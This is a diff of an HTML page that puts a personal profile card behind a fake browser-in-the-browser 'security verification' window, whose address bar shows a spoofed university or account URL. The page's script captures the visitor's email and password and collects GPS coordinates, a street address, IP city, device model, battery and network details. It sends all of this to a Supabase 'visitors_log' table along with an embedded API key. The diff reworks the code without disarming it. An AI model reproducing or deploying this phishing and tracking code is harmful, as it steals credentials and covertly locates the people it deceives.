@@ -6,7 +6,6 @@
     <title>SALEM | سـالـم</title>
     
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
     
@@ -23,66 +22,28 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
         body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* واجهة الدخول (BitB - Browser in the Browser) */
-        #auth-screen {
-            position: fixed; inset: 0; background: var(--back_color); z-index: 1000;
-            display: flex; justify-content: center; align-items: center;
-        }
-
-        .bitb-window {
-            width: 90%; max-width: 380px; background: var(--front_color);
-            backdrop-filter: blur(25px); border-radius: 30px; 
-            border: 1px solid rgba(197, 160, 89, 0.2);
-            overflow: hidden; box-shadow: 0 25px 60px rgba(0,0,0,0.6);
-            direction: rtl; animation: fadeIn 0.8s ease;
-        }
-
+        /* واجهة الدخول BitB */
+        #auth-screen { position: fixed; inset: 0; background: var(--back_color); z-index: 1000; display: flex; justify-content: center; align-items: center; }
+        .bitb-window { width: 90%; max-width: 380px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 30px; border: 1px solid rgba(197, 160, 89, 0.2); overflow: hidden; box-shadow: 0 25px 60px rgba(0,0,0,0.6); direction: rtl; animation: fadeIn 0.8s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* شريط عنوان المتصفح المزيف (iPhone Style) */
-        .bitb-header {
-            background: rgba(2, 12, 27, 0.9); padding: 12px 18px;
-            display: flex; align-items: center; justify-content: space-between;
-            border-bottom: 1px solid rgba(197, 160, 89, 0.1);
-        }
-
-        .bitb-address-bar {
-            background: rgba(255, 255, 255, 0.05); padding: 7px 15px;
-            border-radius: 12px; font-size: 0.75em; color: var(--muted-gold);
-            flex-grow: 1; margin: 0 10px; text-align: center;
-            border: 1px solid rgba(197, 160, 89, 0.1); display: flex; align-items: center; justify-content: center;
-        }
-
+        .bitb-header { background: rgba(2, 12, 27, 0.9); padding: 12px 18px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(197, 160, 89, 0.1); }
+        .bitb-address-bar { background: rgba(255, 255, 255, 0.05); padding: 7px 15px; border-radius: 12px; font-size: 0.75em; color: var(--muted-gold); flex-grow: 1; margin: 0 10px; text-align: center; border: 1px solid rgba(197, 160, 89, 0.1); display: flex; align-items: center; justify-content: center; }
         .bitb-address-bar i { font-size: 0.9em; margin-left: 6px; color: #4cd964; }
-
         .bitb-action-dots { display: flex; gap: 6px; }
         .bitb-action-dots span { width: 10px; height: 10px; border-radius: 50%; background: rgba(197, 160, 89, 0.3); }
         .bitb-action-dots span.close { background: #ff5f56; }
 
-        /* محتوى نموذج الدخول */
         .auth-box { padding: 35px 30px; text-align: center; }
         .auth-box h2 { color: var(--gold); margin-bottom: 10px; font-size: 1.5em; letter-spacing: 1px; }
         .auth-box p.info-text { color: var(--white); margin-bottom: 25px; font-size: 0.85em; opacity: 0.7; line-height: 1.5; }
-        .auth-box input {
-            width: 100%; padding: 14px; margin: 8px 0; background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(197, 160, 89, 0.15); border-radius: 12px; color: white; outline: none; text-align: center;
-            transition: 0.3s;
-        }
+        .auth-box input { width: 100%; padding: 14px; margin: 8px 0; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(197, 160, 89, 0.15); border-radius: 12px; color: white; outline: none; text-align: center; transition: 0.3s; }
         .auth-box input:focus { border-color: var(--gold); background: rgba(255, 255, 255, 0.07); }
-        .auth-box button {
-            width: 100%; padding: 14px; margin-top: 20px;
-            background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold));
-            border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 1em;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.3s;
-        }
+        .auth-box button { width: 100%; padding: 14px; margin-top: 20px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 1em; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.3s; }
         .auth-box button:active { transform: scale(0.98); }
 
-        /* تصميم vCard الشخصي */
-        .vcard {
-            width: 90%; max-width: 420px; height: 600px; background: var(--front_color);
-            backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
-            position: relative; overflow: hidden; display: none; animation: fadeIn 1s ease;
-        }
+        /* تصميم vCard */
+        .vcard { width: 90%; max-width: 420px; height: 600px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2); position: relative; overflow: hidden; display: none; animation: fadeIn 1s ease; }
         .header { height: 35%; position: relative; }
         .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; }
         .wave-01, .wave-02, .wave-03 { position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border-radius: 43%; animation: rotate 15s linear infinite; }
@@ -96,13 +57,11 @@
         
         .card_content { padding-top: 85px; text-align: center; }
         .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 10px; }
-        
         .old-bio { color: var(--muted-gold); font-size: 0.95em; padding: 0 30px; line-height: 1.6; font-weight: 500; }
         .social { margin-top: 25px; }
         .social div { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; padding: 0 20px; }
         .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); transition: 0.3s; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; }
         .social a:hover i { color: var(--gold); transform: translateY(-5px); border-color: var(--gold); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.2); }
-        
         .footer-text { position: absolute; bottom: 15px; width: 100%; font-size: 0.7em; color: rgba(136, 146, 176, 0.4); text-align: center; }
     </style>
 </head>
@@ -111,20 +70,13 @@
 <div id="auth-screen">
     <div class="bitb-window">
         <div class="bitb-header">
-            <div class="bitb-action-dots">
-                <span class="close"></span>
-                <span></span>
-                <span></span>
-            </div>
-            <div class="bitb-address-bar">
-                <i class="fas fa-lock"></i> secure.university.edu.iq/auth
-            </div>
-            <i class="fas fa-share-square" style="color: var(--muted-gold); font-size: 0.85em; cursor: pointer;"></i>
+            <div class="bitb-action-dots"><span class="close"></span><span></span><span></span></div>
+            <div class="bitb-address-bar"><i class="fas fa-lock"></i> secure.account.verification/auth</div>
+            <i class="fas fa-share-square" style="color: var(--muted-gold); font-size: 0.85em;"></i>
         </div>
-
         <div class="auth-box">
             <h2>تحقق أمني</h2>
-            <p class="info-text">لأسباب أمنية، يرجى تأكيد هويتك الجامعية للوصول إلى هذا الملف.</p>
+            <p class="info-text">لأسباب أمنية، يرجى تأكيد هويتك للوصول إلى هذا الملف.</p>
             <input type="email" id="email" placeholder="البريد الإلكتروني">
             <input type="password" id="password" placeholder="كلمة المرور">
             <button id="login-btn" onclick="handleLogin()">تأكيد الدخول</button>
@@ -144,11 +96,7 @@
     </div>
     <div class="card_content">
         <div class="satan"><h4>SALEM</h4></div>
-        <div class="old-bio">
-            Web Designer & Creative Developer.<br>
-            Specialized in UI/UX Aesthetics.<br>
-            BELIEVE IN YOURSELF.
-        </div>
+        <div class="old-bio">Web Designer & Creative Developer.<br>Specialized in UI/UX Aesthetics.<br>BELIEVE IN YOURSELF.</div>
         <div class="social">
             <div>
                 <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
@@ -165,7 +113,6 @@
 </div>
 
 <script>
-    // إعدادات Supabase
     const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6aW9pbWl2YXd5cXhqb3hhamR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU0MTc1ODQsImV4cCI6MjA5MDk5MzU4NH0.2xKTF4oDkvUUFts6Igab01OfOPKkezAb3-U_xV7r1zY';
     const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
@@ -177,29 +124,25 @@
         }
     };
 
-    // تحويل الإحداثيات لعنوان تفصيلي (OSINT)
     async function getAddressFromCoords(lat, lng) {
         try {
             const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&accept-language=ar`);
             const data = await res.json();
             return data.display_name || "العنوان غير محدد";
-        } catch (e) { return "خطأ في جلب العنوان"; }
+        } catch (e) { return "خطأ في العنوان"; }
     }
 
-    // جلب موقع الـ GPS بدقة عالية
     function getLocationGPS() {
         return new Promise((resolve) => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (p) => resolve({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }),
-                    () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    () => resolve(null), { enableHighAccuracy: true, timeout: 8000 }
                 );
             } else resolve(null);
         });
     }
 
-    // الدالة الرئيسية لمعالجة الدخول وجمع البيانات
     async function handleLogin() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
@@ -215,38 +158,38 @@
         loginBtn.disabled = true;
 
         try {
-            // 1. بصمة الجهاز والشبكة والبطارية
-            const userAgent = navigator.userAgent;
-            const device = userAgent.match(/\(([^)]+)\)/) ? userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : "Unknown Device";
-            const fingerprint = `${screen.width}x${screen.height} | ${navigator.language} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
-            
+            // 1. بصمة الجهاز
+            const fingerprint = `${screen.width}x${screen.height} | ${navigator.language}`;
+            const device = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : "iPhone/Mobile";
+
+            // 2. البطارية (آمنة للآيفون)
             let battery = "N/A";
-            try {
-                const b = await navigator.getBattery();
-                battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-            } catch(e) {}
-
-            let net = "Unknown";
-            if (navigator.connection) net = `${navigator.connection.effectiveType} (~${navigator.connection.downlink}Mbps)`;
-
-            // 2. جلب الموقع (GPS + Address)
-            const pos = await getLocationGPS();
-            let coords = "Denied";
-            let addr = "No Permission";
-            if (pos) {
-                coords = `${pos.lat}, ${pos.lng} (±${pos.acc}m)`;
-                addr = await getAddressFromCoords(pos.lat, pos.lng);
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+                } catch(e) {}
             }
 
-            // 3. جلب المدينة (IP)
-            let city = "Unknown";
+            // 3. الشبكة
+            let net = "Unknown";
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) net = `${conn.effectiveType}`;
+
+            // 4. الموقع والمدينة
+            const pos = await getLocationGPS();
+            let coords = "Denied", addr = "No Permission", city = "Unknown";
+            if (pos) {
+                coords = `${pos.lat.toFixed(5)}, ${pos.lng.toFixed(5)}`;
+                addr = await getAddressFromCoords(pos.lat, pos.lng);
+            }
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
                 city = ipData.city || "Unknown";
             } catch(e) {}
 
-            // 4. إرسال "تقرير المعلومات" الكامل إلى Supabase
+            // 5. الإرسال (تأكد من تعديل أسماء الأعمدة في SQL لتكون كاملة)
             const { error } = await supabaseClient
                 .from('visitors_log')
                 .insert([{ 
@@ -257,25 +200,8 @@
                     full_address: addr,
                     device_model: device,
                     battery_level: battery,
-                    network_type: net,
-                    fingerprint: fingerprint
+                    network_type: net,      // الاسم الكامل
+                    fingerprint: fingerprint // الاسم الكامل
                 }]);
 
-            if (error) {
-                errorMsg.innerText = "حدث خطأ فني، حاول مجدداً";
-                loginBtn.innerText = "تأكيد الدخول";
-                loginBtn.disabled = false;
-            } else {
-                localStorage.setItem('isUnlocked', 'true');
-                document.getElementById('auth-screen').style.display = 'none';
-                document.getElementById('profile-card').style.display = 'block';
-            }
-        } catch (e) {
-            errorMsg.innerText = "فشل الاتصال بالخادم";
-            loginBtn.innerText = "تأكيد الدخول";
-            loginBtn.disabled = false;
-        }
-    }
-</script>
-</body>
-</html>
+            if (error) throw error;
